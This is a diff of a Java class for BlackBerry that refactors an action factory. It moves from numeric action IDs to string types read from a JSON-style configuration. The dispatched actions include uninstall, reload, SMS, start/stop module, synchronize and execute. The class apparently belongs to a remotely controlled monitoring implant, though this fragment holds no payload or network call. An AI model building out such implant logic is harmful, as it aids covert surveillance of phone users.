@@ -8,198 +8,180 @@
  * *************************************************/
 package blackberry.action;
 
+import rpc.json.me.JSONException;
 import blackberry.Status;
+import blackberry.Trigger;
 import blackberry.action.sync.SyncActionApn;
 import blackberry.action.sync.SyncActionInternet;
+import blackberry.config.ConfAction;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
+import blackberry.utils.Check;
 
 
 /**
  * The Class SubAction.
  */
-public abstract class SubAction implements Runnable {
+public abstract class SubAction {
     //#ifdef DEBUG
     protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
     //#endif
-
-    public static final int ACTION = 0x4000;
-    public static final int ACTION_SYNC_INTERNET = ACTION + 0x1;
-    public static final int ACTION_UNINSTALL = ACTION + 0x2;
-    public static final int ACTION_RELOAD = ACTION + 0x3;
-    public static final int ACTION_SMS = ACTION + 0x4;
-    public static final int ACTION_TOOTHING = ACTION + 0x5;
-    public static final int ACTION_START_AGENT = ACTION + 0x6;
-    public static final int ACTION_STOP_AGENT = ACTION + 0x7;
-    public static final int ACTION_SYNC_PDA = ACTION + 0x8;
-    public static final int ACTION_EXECUTE = ACTION + 0x9;
-    public static final int ACTION_SYNC_APN = ACTION + 0xa;
-    public static final int ACTION_LOG = ACTION + 0xb;
-
-    public int actionId;
-
-    protected boolean wantUninstall;
-
-    protected boolean wantReload;
+    private final ConfAction conf;
 
     protected Status status;
 
     /**
-     * Factory.
-     * 
-     * @param actionId_
-     *            the action id_
-     * @param confParams
-     *            the conf params
-     * @return the sub action
-     */
-    public static SubAction factory(final int actionId_, final byte[] confParams) {
-        switch (actionId_) {
-        case ACTION_SYNC_INTERNET:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_SYNC ***");
-            //#endif
-            return new SyncActionInternet(actionId_, confParams);
-        case ACTION_UNINSTALL:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_UNINSTALL ***");
-            //#endif
-            return new UninstallAction(actionId_, confParams);
-        case ACTION_RELOAD:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_RELOAD ***");
-            //#endif
-            return new ReloadAction(actionId_, confParams);
-        case ACTION_SMS:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_SMS ***");
-            //#endif
-            return new SmsAction(actionId_, confParams);
-        case ACTION_TOOTHING:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_TOOTHING ***");
-            //#endif
-            return new ToothingAction(actionId_, confParams);
-        case ACTION_START_AGENT:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_START_AGENT ***");
-            //#endif
-            return new StartAgentAction(actionId_, confParams);
-        case ACTION_STOP_AGENT:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_STOP_AGENT ***");
-            //#endif
-            return new StopAgentAction(actionId_, confParams);
-        case ACTION_SYNC_PDA:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_SYNC_PDA ***");
-            //#endif
-            return new SyncPdaAction(actionId_, confParams);
-        case ACTION_EXECUTE:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_EXECUTE ***");
-            //#endif
-            return new ExecuteAction(actionId_, confParams);
-        case ACTION_SYNC_APN:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_SYNC ***");
-            //#endif
-            return new SyncActionApn(actionId_, confParams);
-        case ACTION_LOG:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_INFO ***");
-            //#endif
-            return new LogAction(actionId_, confParams);
-        default:
-            return null;
-        }
-    }
-
-    /**
      * Instantiates a new sub action.
      * 
-     * @param actionId_
-     *            the action id_
+     * @param type
+     *            the type
+     * @param jsubaction
+     *            the params
      */
-    protected SubAction(final int actionId_) {
-        status = Status.getInstance();
-        actionId = actionId_;
+    public SubAction(final ConfAction conf) {
+        this.status = Status.self();
+        this.conf = conf;
+
+        parse(conf);
+    }
+    
+    /**
+     * Factory.
+     * @param type 
+     * 
+     * @param typeId
+     *            the type
+     * @param params
+     *            the conf params
+     * @return the sub action
+     * @throws JSONException
+     * @throws ConfigurationException 
+     */
+    public static SubAction factory(String type, final ConfAction params) throws  ConfigurationException {
+        Check.asserts(type != null,"factory: null type");
+        
+        if (type.equals("uninstall")) {
+
+            //#ifdef DEBUG
+            debug.trace("factory *** ACTION_UNINSTALL ***");
+            //#endif
+
+            return new UninstallAction(params);
+        } else if (type.equals("reload")) {
+            //#ifdef DEBUG
+            debug.trace("factory *** ACTION_RELOAD ***");
+            //#endif
+
+            return new ReloadAction(params);
+
+        } else if (type.equals("sms")) {
+            //#ifdef DEBUG
+            debug.trace("factory *** ACTION_SMS ***");
+            //#endif
+
+            return new SmsAction(params);
+
+        } else if (type.equals("module")) {
+            String status = params.getString("status");
+            if (status.equals("start")) {
+                //#ifdef DEBUG
+                debug.trace("factory *** ACTION_START_MODULE ***");
+                //#endif
+  
+                return new StartModuleAction(params);
+            } else if (status.equals("stop")) {
+                //#ifdef DEBUG
+                debug.trace("factory *** ACTION_STOP_MODULE ***");
+                //#endif
+
+                return new StopModuleAction(params);
+
+            }
+        } else if (type.equals("event")) {
+            String status = params.getString("status");
+            if (status.equals("start")) {
+                //#ifdef DEBUG
+                debug.trace("factory *** ACTION_START_EVENT ***");
+                //#endif
+
+                return new StartEventAction(params);
+            } else if (status.equals("stop")) {
+                //#ifdef DEBUG
+                debug.trace("factory *** ACTION_STOP_EVENT ***");
+                //#endif
+      
+                return new StopEventAction(params);
+
+            }
+
+        } else if (type.equals("synchronize")) {
+            boolean apn = params.has("apn");
+            if (apn) {
+                //#ifdef DEBUG
+                debug.trace("factory *** ACTION_SYNC_APN ***");
+                //#endif
+  
+                return new SyncActionApn(params);
+            } else {
+                //#ifdef DEBUG
+                debug.trace("factory *** ACTION_SYNC ***");
+                //#endif
+
+                return new SyncActionInternet(params);
+            }
+
+        } else if (type.equals("execute")) {
+            //#ifdef DEBUG
+            debug.trace("factory *** ACTION_EXECUTE ***");
+            //#endif
+
+            return new ExecuteAction(params);
+
+        } else if (type.equals("log")) {
+            //#ifdef DEBUG
+            debug.trace("factory *** ACTION_INFO ***");
+            //#endif
+
+            return new LogAction(params);
+        } else {
+            //#ifdef DEBUG
+            debug.error("factory Error: unknown type: " + type);
+            //#endif
+
+        }
+        return null;
     }
 
-    /**
-     * Execute.
-     * 
-     * @param event
-     *            the event
-     * @return true, if successful
-     */
-    public abstract boolean execute(Event event);
 
-    private Event triggeringEvent;
+    public String getType(){
+        return conf.getType();
+    }
+    
+    /** The finished. */
     private boolean finished;
 
     /**
-     * Prepare the execution, setting parameters and setting to false
-     * "finished". finished variables is used to know if the execution is
-     * actually finished.
+     * Parse
      * 
-     * @param triggeringEvent
+     * @param jsubaction
+     *            byte array from configuration
      */
-    public void prepareExecute(final Event triggeringEvent) {
-        this.triggeringEvent = triggeringEvent;
-        synchronized (this) {
-            finished = false;
-        }
-    }
-
-    public synchronized boolean isFinished() {
-        return finished;
-    }
-
-    public void run() {
-        try {
-            execute(triggeringEvent);
-        } finally {
-            synchronized (this) {
-                notifyAll();
-                finished = true;
-            }
-        }
-    }
+    protected abstract boolean parse(final ConfAction conf);
 
     /**
-     * Parses the.
+     * Execute.
+     * @param trigger 
      * 
-     * @param confParams
-     *            the conf params
      * @return true, if successful
      */
-    protected abstract boolean parse(byte[] confParams);
-
-   
+    public abstract boolean execute(Trigger trigger);
+    
     //#ifdef DEBUG
     public String toString() {
-        return "" + actionId;
+        return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" +conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
     }
     //#endif
 
-    /**
-     * Want reload.
-     * 
-     * @return true, if successful
-     */
-    public final boolean wantReload() {
-        return wantReload;
-    }
-
-    /**
-     * Want uninstall.
-     * 
-     * @return true, if successful
-     */
-    public final boolean wantUninstall() {
-        return wantUninstall;
-    }
 
 }
